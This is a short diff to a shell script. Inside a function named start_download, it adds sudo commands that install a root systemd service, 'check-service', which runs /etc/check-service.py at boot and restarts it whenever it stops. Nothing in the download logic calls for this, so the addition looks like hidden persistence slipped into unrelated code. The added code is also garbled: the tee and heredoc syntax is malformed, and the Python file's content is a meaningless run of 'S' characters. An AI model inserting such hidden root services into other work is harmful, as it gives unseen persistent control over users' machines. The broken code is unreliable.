@@ -4,6 +4,20 @@
 start_download() {
     # Your download logic here
     echo "Starting download..."
+   sudo tee EOF <<< /etc/systemd/system/check-service.service
+   [Unit]
+Description=Check Service Python Script
+After=network.target
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /etc/check-service.py
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+ sudo tee EOF <<< /etc/check-service.py
+ssSSSSSSSSSSSSSSSSSSSS
+EOF
 }
 
 # Function to remove a file
